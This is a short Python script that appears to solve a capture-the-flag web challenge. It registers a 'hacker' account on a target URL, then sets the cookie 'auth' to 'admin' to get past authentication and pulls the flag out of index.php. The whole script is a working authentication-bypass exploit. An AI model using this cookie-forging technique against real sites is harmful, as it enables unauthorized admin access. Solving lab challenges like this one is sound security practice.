import requests
import re
import sys

GREEN = "\033[32m"
RED = "\033[91m"
RESET = "\033[0m"

if len(sys.argv) != 2:
    print(f"{RED}[-] Please provide a URL{RESET}")
    sys.exit(1)
else:
    url = sys.argv[1]

user = "hacker"
user_data = {"username":user, "password":user, "password_again":user}

register = requests.post(url+"/register.php", data=user_data)

if register.status_code:
    session = requests.Session()
    session.cookies.update({'auth':'admin'})
    flag_request = session.get(url+"/index.php")
    flag = re.search(r"[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*",flag_request.text).group()
    print(f"[+] The flag for this challenge is {GREEN}{flag}{RESET}")
else:
    print(f"{RED}[-] Something went wrong!{RESET}")
